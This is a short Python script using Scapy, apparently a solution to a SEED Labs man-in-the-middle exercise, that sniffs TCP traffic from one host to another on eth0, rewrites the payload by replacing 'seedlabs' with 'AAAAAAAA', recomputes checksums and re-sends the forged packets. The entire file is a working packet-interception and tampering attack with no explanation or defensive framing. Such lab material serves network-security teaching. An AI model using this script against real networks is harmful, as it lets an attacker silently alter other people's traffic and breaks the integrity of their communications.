from scapy.all import *

MAC_A = "02:42:0a:09:00:05"
IP_B = "192.168.60.5"

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        newdata = data.replace(b'seedlabs', b'AAAAAAAA')
        send(newpkt/newdata)
    else:
        send(newpkt)
        
f = 'tcp and ether src {A} and ip dst {B}'.format(A=MAC_A, B=IP_B)
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)